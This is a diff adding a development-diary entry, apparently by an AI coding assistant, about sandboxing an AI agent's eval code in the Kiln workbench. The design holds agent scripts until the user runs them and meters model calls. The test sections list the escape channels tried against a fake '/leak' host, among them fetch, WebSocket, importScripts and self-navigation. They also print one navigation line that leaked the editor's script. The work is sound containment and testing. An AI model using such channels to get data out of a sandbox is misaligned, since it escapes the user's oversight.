@@ -1759,3 +1759,165 @@ server that keeps agent-proposed work waiting for the user.
 
 - Hunk inventory: `git diff -U0 apps/workbench/src/ui/wb.js`. The worker's hunks were 3, 5, 6, 19, 21 and 22, plus
   the `startServer()` line inside hunk 7.
+
+## Step 18: Phase 7 — the agent's sandbox, held scripts and the model gateway
+
+Phase 7 is done. Agent eval code now runs in a dedicated worker that a sandboxed, opaque-origin iframe starts, and it
+reaches the workbench only through one `MessagePort`. The page answers only the calls its scope lists and enforces the
+run mode on its own side. A script the agent writes is held until the user presses Run. A page served by the Kiln
+server reaches the model through `/api/agent/sample`, which writes one `llm_calls` row per call. The gateway half is
+the worker's (`reference/08-phase7-gateway-diary.md`, Steps 1–3); the sandbox, the hold, the shared compile path and
+the browser test are mine.
+
+The done-condition holds in Chrome against the development server and a fake model upstream:
+
+- an eval's `fetch` to `/api/jobs/…/approve` fails and approves nothing;
+- `localStorage` does not exist in the eval's realm;
+- an agent-proposed job is still `proposed` 3 s later;
+- the usage endpoint reports two token rows for two model calls, filed under the conversation.
+
+The browser test found one channel the first design left open: the frame could navigate itself and send data in the
+URL. Eval code was moved from the frame's document into a worker, which has no document to navigate.
+
+### Prompt Context
+
+**User prompt (verbatim):** see Step 1 (the "Once upload, then implement it…" request).
+
+**Assistant interpretation:** Implement guide Phase 7 (§31) to its done-condition, prove it in a browser, document
+the as-built design, and commit my work together with the gateway worker's.
+
+**Inferred user intent:** An agent that can work on the user's compiler and propose GPU jobs without being able to act
+with the user's authority, and with its model use counted.
+
+**Commit (code):** recorded in the next checkpoint.
+
+### What I did
+
+- Moved the compile path out of `wb.js` into `apps/workbench/src/compile.js` (`compileScript`, `pipelineFor`,
+  `endToEnd`, `hasKernels`, `checkResult`), so the page and the worker compile by the same code. Added
+  `EvidenceStore.slice(device)` and `EvidenceStore.fromSlice()` in `packages/kiln/src/std/store.js` to send one
+  device's evidence to the worker.
+- Split the agent: `agent/encode.js` (summaries, `yaml`, wire format), `agent/inspect.js` (`ir`, `trace`),
+  `agent/frame.js` (`startFrame`: the eval's names and its run), `agent/sandbox.js` (`servePort`, `runInFrame`), and
+  `agent/agent.js` (conversation loop, `runEval`, `pageCall`, `frameContext`, the handle API).
+- Added held scripts: `wb.pending`, `holdScript`, `runScript`, `HeldScriptError`, the Scripts Hold/Run setting, the
+  held bar in the Code view (`Ide.jsx`, `.held` in `views.css`).
+- Wired the gateway into the page (`main.jsx`): without `window.claude`, a server-served page uses
+  `gatewaySample` when `/api/agent/usage` says `ready`. Exposed `window.__kiln.agent` for the browser test.
+- Wrote `apps/workbench/test/sandbox.mjs` (36 checks, in `pnpm test`) and `apps/workbench/test/agent-e2e.mjs`
+  (20 checks, `pnpm --filter @kiln/workbench test:agent`).
+- Found the navigation channel with the first version of `agent-e2e.mjs` (below), then moved eval code into a worker:
+  `agent/frame-main.js` became `agent/worker-main.js`, `build.mjs` emits `WORKER_JS`, and `frameDoc()` embeds it as a
+  string literal with `<` escaped. The frame's CSP gained `worker-src blob:`.
+- Updated `test/ui.mjs`'s agent evals to the async bridge API and moved its `measure` before `editor.edit`.
+- Updated guide §30.1, §30.3 and §31 (now §31.1–31.5, as built), `apps/server/README.md`, and
+  `agent-guidelines.txt`.
+- Screenshots in `various/screens/`: `p7-agent-light-1600.png`, `p7-agent-dark-1600.png`, `p7-agent-dark-390.png`,
+  `p7-held-light-1600.png`, `p7-held-dark-390.png`, `p7-jobs-light-1600.png`.
+
+### Why
+
+- **Held scripts.** The guide's §31 sandboxed the eval but not its output. A project script is JavaScript the page
+  compiles with the page's authority, so `editor.set(text)` from a sandboxed eval would have run agent-written code
+  with full access to the token. The hold closes that path; the worker's own compile keeps the agent informed.
+- **One compile path.** `ir`, `trace` and `editor.check` must return live objects and accept predicates, which cannot
+  cross a `MessagePort`. The worker compiles the editor's script itself, so it has to compile it exactly as the page
+  does, including evidence-decided forks.
+- **The worker.** Nothing in the CSP or the sandbox attribute stops a frame from navigating itself, and the test
+  showed the navigation request leaving. A worker has no document, and it inherits the frame's CSP for every request
+  it can make.
+
+### What worked
+
+- `pnpm test`: evidence 125 tests, kiln 10 files, server 62 tests (13 gateway), workbench 5 files (`gateway.mjs` 33
+  checks, `sandbox.mjs` 36 checks). `pnpm build` and `node scripts/contrast.mjs` pass. `test/server-e2e.mjs` passes.
+- `node test/agent-e2e.mjs`: 20 of 20. The eval's result in the browser:
+
+  ```yaml
+  realm: undefined undefined undefined undefined
+  approve: "TypeError: Failed to fetch"
+  fetch: TypeError
+  webSocket: constructed
+  eventSource: constructed
+  importScripts: NetworkError
+  worker: SecurityError
+  navigate: TypeError
+  job: proposed
+  ran: false
+  compiles: true
+  ```
+
+  Every attempt was aimed at the fake upstream's `/leak` path, and none arrived. `/api/agent/usage` reported
+  `2 calls, 2003 in, 340 out, est 15869`, and the conversation row matched the page's conversation id.
+- A runaway eval (`while (true) {}`) left the page answering `Runtime.evaluate` within 5 s; Stop marked the step
+  `stopped` and removed the frame, which ends its worker.
+- Positive control for the leak check: with `connect-src *` appended to `FRAME_CSP`, the test failed with
+  `got /leak?fetch /leak?sse /leak?ws`. With the CSP restored it passed again.
+
+### What didn't work
+
+- The first `agent-e2e.mjs` run failed one check because the YAML encoder quotes the string `"null"`:
+  `windowOpen: "null"` did not match `/windowOpen: null/`. The regex was wrong, not the behaviour.
+- The first design ran eval code in the frame's document. An eval doing
+  `location.href = "http://127.0.0.1:<port>/leak?script=" + encodeURIComponent((await editor.get()).slice(0, 24))`
+  produced, at the fake server:
+  `the navigation's request reached the network: /leak?script=%2F**%20W-05%20RMSNorm%2C%20fused%20`.
+  Detecting the frame's second `load` event ended the eval but could not stop the request, so I replaced the
+  detection with the worker and deleted it.
+- `node test/ui.mjs` cannot run here: `Error: Cannot find module 'playwright'`. Its seven updated agent evals were
+  run instead through the `MessageChannel` transport in Node; all returned `ok`, with the table and code parts
+  present and the edit held.
+
+### What I learned
+
+- An exception name does not prove that a request stayed in. With `connect-src *`, `fetch` from the opaque origin
+  still threw `TypeError`, because the response could not be read, but the request had reached the host. Only the
+  receiving side can show that nothing left.
+- A worker created from a `blob:` URL inherits its creator's CSP in Chrome: `importScripts` from another host fails
+  with `NetworkError` and `new Worker(url)` with `SecurityError`. `WebSocket` and `EventSource` construct without
+  throwing and fail asynchronously.
+- Node's HTTP server reports a WebSocket handshake as an `upgrade` event, not a `request`; a leak check that listens
+  only for requests would miss it.
+
+### What was tricky to build
+
+- The worker's compile must equal the page's. Params, pins, kernel pins, the target and the device's evidence all
+  feed the compile, so `ctx` carries each, and a page call that changes any of them returns a new `ctx`.
+  `editor.check` in the worker is compared to the page's `runSummary` in `sandbox.mjs`, including an evidence decision
+  after measuring.
+- Some calls are made while a script is held, and their results would describe a compile that the editor no longer
+  shows. Each such call refuses with `HeldScriptError` rather than answering about the stale compile.
+- Embedding a 1.5 MB bundle in `srcdoc`: a `<script>` element ends at `</script` and changes parsing state at `<!--`.
+  Encoding the bundle as a JSON string literal with every `<` written as `<` keeps every byte of it out of the
+  HTML parser's way and preserves the code exactly.
+
+### What warrants a second pair of eyes
+
+- `pageCall` and the read-only wrappers in `agent.js`: the page side is the only enforcement of the run mode.
+- `HELD` and the list of calls it blocks: a call missing from the list would answer about a stale compile.
+- The gateway (worker's code): no upstream timeout and no concurrency cap, so a stuck model call holds its request
+  until the page stops it; `apiKey` is a plain config field (never logged or returned, but held in memory as text).
+- The worker is started per eval and parses the whole bundle each time; its start-up cost was not measured apart
+  from the eval's.
+
+### What should be done in the future
+
+- Port `test/ui.mjs` from Playwright to `scripts/shoot.mjs` (already listed), then run its agent section.
+- An upstream timeout and a concurrency cap for `/api/agent/sample`.
+- Measure the per-eval worker start-up cost; if it matters, keep one worker per answer instead of per eval.
+
+### Code review instructions
+
+- Start at `apps/workbench/src/agent/sandbox.js` (`frameDoc`, `runInFrame`), then `agent/frame.js` (`runEval`),
+  then `pageCall`, `frameContext` and `HELD` in `agent/agent.js`.
+- Validate: `pnpm test`; `pnpm --filter @kiln/workbench test:agent` (Chrome); `pnpm --filter @kiln/workbench
+  test:server`.
+
+### Technical details
+
+- CSP: `default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; worker-src blob:`.
+- Messages: `{t:"kiln-port"}` (page → frame, with the port), `{t:"eval", code, api, ctx}`, `{t:"call", id, path,
+  args}`, `{t:"ret", id, ok, value, ctx?}` or `{t:"ret", id, ok:false, error:{name, message}}`,
+  `{t:"done", ok, out, lang, logs}`.
+- `agent-e2e.mjs` env for the development server: `KILN_MODEL=fake-model`,
+  `KILN_MODEL_URL=http://127.0.0.1:<fake>/v1/messages`, `ANTHROPIC_API_KEY=<random test value>`.
